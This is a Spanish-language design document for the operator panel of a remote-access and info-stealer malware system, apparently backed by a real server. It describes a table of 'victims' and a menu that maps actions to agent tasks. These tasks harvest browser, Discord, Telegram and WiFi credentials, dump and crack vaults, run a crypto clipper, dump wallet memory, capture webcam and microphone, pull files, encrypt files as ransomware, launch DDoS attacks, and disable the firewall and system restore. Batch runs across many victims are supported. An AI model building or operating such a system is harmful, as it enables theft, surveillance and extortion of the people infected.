# Panel de operación (web y escritorio)

Este documento describe la pantalla única de operación, los atajos y el mapa
acción → tarea. El contrato WS/HTTP y los umbrales T1–T6 no cambian aquí.

## Estructura

```
┌ Topbar: título, estado live, búsqueda global ─────────────────────────────┐
├ Aviso de socket caído / aviso de resultado ──────────────────────────────┤
├ Filtros: texto, estado, SO, país, etiqueta, build ───────────────────────┤
│ Tabla de equipos (columnas ordenables)          │ Detalle de la víctima   │
│  checkbox · equipo · usuario · SO · versión …   │ Resumen/Ficheros/…      │
├ Log de sesión persistente: filtro, pausa, enlaces a tarea/artefacto ─────┤
└──────────────────────────────────────────────────────────────────────────┘
```

- `/victims` es el centro. `/victims/[id]` redirige a `/victims?select=<id>`
  para conservar enlaces antiguos.
- La selección vive en `?select=` y la pestaña en `?tab=`, así que el botón
  atrás y los enlaces compartidos funcionan.
- El modal solo se usa para formularios de parámetros. Las acciones simples se
  encolan directamente desde el menú.

Capturas de referencia: [vacío](ui/victims-vacio.png) ·
[selección](ui/victims-seleccion.png) · [menú](ui/victims-menu.png) ·
[tarea en curso](ui/victims-tarea.png).

## Columnas y densidad

Columnas disponibles: `equipo`, `usuario`, `SO`, `versión`, `perfil`, `IP/país`,
`última señal`, `socket`, `artefactos`, `grupo`.

- Filas de 32 px y datos en monoespaciado; SO con icono y país con bandera.
- Cabeceras ordenables (asc/desc). El orden y las columnas se persisten por
  operador en `localStorage` (`spc.victims.columns.v2`, `spc.victims.sort.v2`).
- `socket` es el control WS real; `hb`/`off` solo describen el heartbeat. Una
  acción exige socket aunque el heartbeat sea reciente.
- `Shift+clic` selecciona un rango; el checkbox de cabecera selecciona lo
  filtrado.

## Teclado

| Tecla | Acción |
|---|---|
| `/` | Foco en la búsqueda de equipos |
| `↑` / `↓` | Mover la selección por la tabla |
| `Enter` | Abrir el detalle del equipo seleccionado |
| `Menú` / `Shift+F10` | Abrir el menú contextual de la fila |
| `Ctrl+K` | Paleta de acciones del equipo seleccionado |
| `Esc` | Cerrar menú, paleta, formulario o diálogo de lote |
| `↑` / `↓` + `Enter` dentro del menú | Navegar y ejecutar sin ratón |

El foco visible es un anillo de 2 px. Los controles con razón de deshabilitado
llevan `aria-disabled` y la razón en `title`.

## Estados

- **Vacío**: “Ningún equipo coincide” con indicación de filtros o matrícula.
- **Carga**: esqueleto de filas; nunca un panel en blanco.
- **Error**: mensaje del código real y botón de reintento.
- **Panel sin stream**: franja roja, acciones deshabilitadas con motivo.
- **Equipo sin socket**: acciones deshabilitadas con “equipo sin socket de
  control”; el detalle explica que el heartbeat no basta.
- **Tarea en curso**: barra en el detalle con botón de cancelar.

Los errores `agent_offline`, `busy`, `429`, `invalid_params`,
`discord_unlinked` y `discord_channel_missing` se muestran con su causa y el
siguiente paso. Nunca “algo falló”.

## Menú contextual

Clic derecho o tecla `Menú` sobre una fila. Grupos: Sesión, Energía, Opciones,
Extra, Credenciales, Portapapeles, Wallets, Ficheros, Monitor, Cifrado, Red y
Peligro. Cada entrada muestra la tarea y los parámetros exactos. Las acciones
destructivas llevan un punto rojo.

## Mapa acción → tarea

| Grupo | Acción | Tarea | Parámetros |
|---|---|---|---|
| Sesión | Abrir detalle | — | pestaña local |
| Sesión | Chat | `shell` | message box del SO; hilo en `events` (`chat_out`) |
| Sesión | Etiquetas y nota | — | `PATCH /victims/:id` |
| Sesión | Captura | `screenshot` | `{}` |
| Sesión | Buscar actualización | `agent` | `update check` |
| Sesión | Persistencia on/off | `agent` | `persist on` / `persist off` |
| Sesión | Dormir | `agent` | `sleep 60` |
| Sesión | Reiniciar gateway | `agent` | `gateway restart` |
| Sesión | Reconectar socket | `agent` | `reconnect` |
| Energía | Apagar | `shell` | `shutdown /s /t 0 /f` · `systemctl poweroff` |
| Energía | Reiniciar | `shell` | `shutdown /r /t 0 /f` · `systemctl reboot` |
| Energía | Cerrar sesión | `shell` | `shutdown /l /f` · `loginctl terminate-user $USER` |
| Energía | Suspender | `shell` | `rundll32 powrprof.dll,SetSuspendState` · `systemctl suspend` |
| Opciones | Pantalla en blanco | `shell` | formulario WinForms negro |
| Opciones | Bloquear entrada 30 s | `shell` | `BlockInput(true/false)` |
| Opciones | TaskMgr | `shell` | `start "" taskmgr` |
| Opciones | Regedit | `shell` | `start "" regedit` |
| Opciones | Activar UAC | `shell` | `EnableLUA=1` |
| Opciones | Apagar firewall | `shell` | `netsh advfirewall set allprofiles state off` |
| Opciones | Windows Update | `shell` | `UsoClient StartScan` |
| Opciones | Pantalla azul simulada | `shell` | formulario BSOD bloqueante |
| Opciones | Quitar restaurar sistema | `shell` | `Disable-ComputerRestore` |
| Extra | Procesos | `shell` | `tasklist /v` · `ps aux` (vista) |
| Extra | Inicio automático | `shell` | `wmic startup` · `systemctl list-unit-files` (vista) |
| Extra | Programas | `shell` | `reg query Uninstall` · `dpkg -l` (vista) |
| Extra | Conexiones TCP | `shell` | `netstat -ano` · `ss -tunap` (vista) |
| Extra | Ventana activa | `shell` | `GetForegroundWindow` (vista) |
| Extra | Consultar registro | `shell` | formulario `reg query` |
| Extra | Buscar ficheros | `shell` | `where /r` · `find` y tabla de resultados |
| Extra | Message box | `shell` | `PresentationFramework` · `zenity` |
| Extra | Abrir URL | `shell` | `start "" URL` · `xdg-open URL` |
| Credenciales | Harvest completo | `harvest` | `{}` |
| Credenciales | Navegadores | `harvest` | `{kind:"browsers"}` |
| Credenciales | Discord | `harvest` | `{kind:"discord"}` |
| Credenciales | Telegram | `harvest` | `{kind:"telegram"}` |
| Credenciales | WiFi | `harvest` | `{kind:"wifi"}` |
| Credenciales | ProductKey | `harvest` | `{kind:"productkey"}` |
| Credenciales | Hives | `agent` | `hives` |
| Credenciales | Escanear wallets | `scan_wallets` | formulario de límites |
| Credenciales | Extraer vault | `dump_vault` | `{target}` |
| Credenciales | Romper vault | `crack_vault` | `{target,max_seconds,max_cpu_pct}` |
| Portapapeles | Iniciar/parar clipper | `clip_start` / `clip_stop` | `{}` |
| Portapapeles | Secretos on/off | `agent` | `clip secrets on` / `off` |
| Portapapeles | Estado | `agent` | `clip status` |
| Wallets | Vigilar on/off/status | `agent` | `wallet watch …` |
| Wallets | Volcar memoria | `agent` | `memdump <wallet>` |
| Ficheros | Descargar | `file_pull` | `{path,max_mb}`, listado `agent ls` |
| Ficheros | Descarga masiva | `file_pull` | una tarea por ruta |
| Ficheros | Subir desde URL | `files` | `{action:"upload",path,url,max_mb}` |
| Ficheros | Comprimir carpeta | `files` | `{action:"compress",path}` |
| Monitor | Ráfaga de pantalla | `monitor` | `{seconds,fps,quality}` |
| Monitor | Foto de webcam | `webcam` | `{}` |
| Monitor | Clip de micrófono | `mic` | `{seconds}` |
| Cifrado | Cifrar/descifrar/estado | `ransomware` | `{action,path,note?}` |
| Red | DDoS | `ddos` | `{method,host,port,seconds,concurrency}` |
| Peligro | Cerrar agente | `agent` | `kill` |
| Peligro | Revocar/restaurar | — | `POST /victims/:id/revoke` |
| Peligro | Eliminar víctima | — | `DELETE /victims/:id` |
| Peligro | Cancelar tareas | `cancel` | una cancelación por tarea activa |

## Acciones en lote

`Acción en lote` sobre la selección. La confirmación enumera el número y los
equipos, marca los que no tienen socket y luego ejecuta **una petición por
equipo** para conservar el resultado parcial. El resumen muestra `ok`/`fallo`
con el código (`agent_offline`, `busy`, `429`, …) por host.

Lote disponible: persistencia, harvest y sus tipos, captura, update, scan,
clipper, wallet watch y cancelar tareas.

## Log de sesión

Franja inferior fija, `aria-live="polite"`, con eventos y tareas de la víctima
seleccionada. Filtros: todo, tareas, eventos, secretos, errores. Botón de pausa
(acumula contador) y limpieza de vista. Cada fila enlaza a su tarea o a
Ficheros cuando hay `upload_id`. Los valores largos se recortan; los secretos se
pueden copiar desde su pestaña.

## Detalle y pestañas

Resumen, Ficheros, Keylogger, Portapapeles, Credenciales, Wallets, Tareas,
Eventos, Monitor y Chat. Cada pestaña vacía explica qué acción la llena y ofrece
el botón correspondiente. Las vistas de procesos, inicio, programas, TCP y
ventana activa se renderizan como tablas de solo lectura.

## Aplicación de escritorio (Tauri 2)

La web sigue intacta y se puede usar en navegador. El cliente de escritorio
carga el panel remoto en una ventana Tauri y añade menú de aplicación, bandeja,
notificaciones y título de ventana. No reescribe la UI ni cambia el backend.

- Código: `desktop/` (shell) + `console/src/lib/desktop.ts` (puente).
- Servidor: `desktop.json` en el directorio de configuración de la app. Solo
  HTTPS; `http://localhost` se acepta para desarrollo.
- Ventana de servidor: `desktop/ui/index.html` (se muestra si no hay URL).
- Capacidades remotas: `https://*`, `http://localhost:*`, `http://127.0.0.1:*`.
- El cierre de la ventana la oculta en la bandeja; `Salir` termina la app.
- Notificaciones: tareas en error y secretos encontrados solo con la ventana
  oculta.

Dependencias Linux (Fedora):

```sh
sudo dnf install webkit2gtk4.1-devel gtk3-devel librsvg2-devel dbus-devel \
  pkgconf-pkg-config openssl-devel
```

Dependencias Linux (Debian/Ubuntu):

```sh
sudo apt install libwebkit2gtk-4.1-dev libgtk-3-dev librsvg2-dev \
  libayatana-appindicator3-dev pkg-config libssl-dev
```

Compilar:

```sh
cd desktop
npm ci
npm run dev            # desarrollo
npm run build:linux    # deb + AppImage
npm run build:windows  # nsis + msi (en Windows)
```

La app apunta al servidor existente; PostgreSQL y Fastify siguen en el VPS. No
hay base de datos local ni cambios de Prisma.

## Pruebas

- `npx tsx --test tests/panel-ui.test.ts`: tabla, menú, teclado, confirmación de
  lote, vacío/error.
- `npx tsx --test tests/tasks.test.ts`: validación de las 17 tareas.
- `contract/v1/ws-validate.ts` y `ws-check` siguen sin cambios de protocolo.
